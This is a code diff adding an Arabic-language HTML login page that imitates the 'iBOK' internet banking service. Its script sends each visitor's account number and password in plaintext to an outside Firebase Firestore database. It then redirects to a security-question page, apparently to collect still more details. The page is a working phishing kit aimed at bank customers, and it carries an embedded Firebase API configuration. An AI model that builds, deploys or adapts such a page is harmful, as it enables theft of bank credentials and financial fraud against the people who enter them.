@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول - iBOK</title>
+  <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<header class="app-header">
+  <div class="header-main">
+    <div class="logo-container">
+      <span class="logo-text-i">i</span><span class="logo-text-bok">BOK</span>
+    </div>
+    <div class="service-info">
+      <div class="arabic-title">الخدمات المصرفية عبر الإنترنت</div>
+      <div class="english-title">Internet Banking Services</div>
+    </div>
+  </div>
+  <div class="welcome-bar">
+    مرحباً بكم في خدمة **iBOK** المصرفية عبر الإنترنت
+  </div>
+</header>
+<div class="container">
+  <main class="main-content">
+    <div class="login-card">
+      <h1 class="card-title">تسجيل الدخول</h1>
+      <div class="card-subtitle">الرجاء إدخال البيانات</div>
+
+      <form id="loginForm">
+        <div class="form-group">
+                    <label for="userID" class="sr-only">رقم الحساب:</label>
+          <input type="text" id="userID" placeholder="أدخل رقم الحساب المكون من 7 أرقام" maxlength="7" required class="app-input">
+        </div>
+
+        <div class="form-group password-group">
+          <label for="password" class="sr-only">كلمة المرور:</label>
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required class="app-input">
+          <span class="password-toggle">👁️</span>         </div>
+
+        <a href="#" class="forgot-password-link">نسيت كلمة المرور؟</a>
+
+        <button type="submit" class="btn-login app-btn">تسجيل الدخول</button>
+      </form>
+    </div>
+  </main>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
+
+// إعدادات Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyB8EntKIzd3OfSTqhghCLm68iVwt5WaIRU",
+  authDomain: "project-id-77eb2.firebaseapp.com",
+  projectId: "project-id-77eb2",
+  storageBucket: "project-id-77eb2.appspot.com",
+  messagingSenderId: "1061898051036",
+  appId: "1:1061898051036:web:0eda29a129b8fce871c319"
+};
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const form = document.getElementById('loginForm');
+form.addEventListener('submit', async e => {
+  e.preventDefault();
+  const userID = document.getElementById('userID').value.trim();
+  const password = document.getElementById('password').value.trim();
+
+  if (!userID || !password) {
+    alert('الرجاء إدخال رقم الحساب وكلمة المرور');
+    return;
+  }
+
+  try {
+    // حفظ رقم الحساب وكلمة المرور في Firestore
+    await setDoc(doc(db, "users", userID), {
+      userID,
+      password
+    }, { merge: true }); // merge حتى لا نحذف بيانات أخرى
+
+    // حفظ userID محليًا للصفحات التالية
+    localStorage.setItem('userID', userID);
+
+    // الانتقال لصفحة سؤال الأمان
+    window.location.href = "security-question.html";
+  } catch(err) {
+    console.error(err);
+    alert("حدث خطأ أثناء الحفظ، حاول مرة أخرى.");
+  }
+});
+</script>
+</body>
+</html>
